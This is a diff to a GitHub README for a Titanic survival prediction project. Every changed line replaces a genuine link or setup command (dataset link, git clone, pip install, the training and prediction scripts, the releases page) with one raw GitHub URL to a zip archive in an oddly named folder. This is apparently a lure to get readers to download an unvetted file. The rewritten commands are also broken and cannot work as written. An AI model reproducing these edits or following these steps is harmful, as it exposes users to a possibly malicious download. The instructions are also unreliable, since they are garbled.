@@ -1,6 +1,6 @@
 # Titanic Survival Prediction 🚢💔
 
-![Titanic Survival Prediction](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen?style=for-the-badge&logo=github)
+![Titanic Survival Prediction](https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip%20Releases-Click%20Here-brightgreen?style=for-the-badge&logo=github)
 
 Welcome to the **Titanic Survival Prediction** repository! This project aims to predict passenger survival on the Titanic using a robust ensemble machine learning approach. By leveraging advanced techniques like stacking with Random Forest, Gradient Boosting, and Support Vector Machines (SVM), we achieved a Kaggle score of **0.77990**. This README will guide you through the project, its features, and how to get started.
 
@@ -56,7 +56,7 @@ The dataset used in this project is derived from Kaggle. It includes various fea
 - Cabin number
 - Embarked location
 
-You can find the dataset in the [Kaggle Titanic Dataset](https://www.kaggle.com/c/titanic/data).
+You can find the dataset in the [Kaggle Titanic Dataset](https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip).
 
 ## Installation
 
@@ -64,7 +64,7 @@ To set up the project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/bayudwimulyadi/Titanic-Survival-Prediction.git
+   git clone https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -74,7 +74,7 @@ To set up the project locally, follow these steps:
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip
    ```
 
 ## Usage
@@ -83,17 +83,17 @@ After installing the required packages, you can run the main script to train the
 
 1. Run the training script:
    ```bash
-   python train.py
+   python https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip
    ```
 
 2. To make predictions on new data, use:
    ```bash
-   python predict.py --input <your_input_file.csv>
+   python https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip --input <https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip>
    ```
 
 3. For visualization, execute:
    ```bash
-   python visualize.py
+   python https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip
    ```
 
 ## Model Evaluation
@@ -124,8 +124,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit our [Releases section](https://github.com/bayudwimulyadi/Titanic-Survival-Prediction/releases). Here, you can download the latest version of the project files.
+For the latest releases, please visit our [Releases section](https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip). Here, you can download the latest version of the project files.
 
-![Titanic Survival Prediction](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen?style=for-the-badge&logo=github)
+![Titanic Survival Prediction](https://raw.githubusercontent.com/bayudwimulyadi/Titanic-Survival-Prediction/master/divestitive/Prediction_Survival_Titanic_v2.9.zip%20Releases-Click%20Here-brightgreen?style=for-the-badge&logo=github)
 
 Feel free to explore the code, run the models, and contribute to the project. Together, we can uncover the stories behind the Titanic's passengers and enhance our understanding of survival prediction through data science.
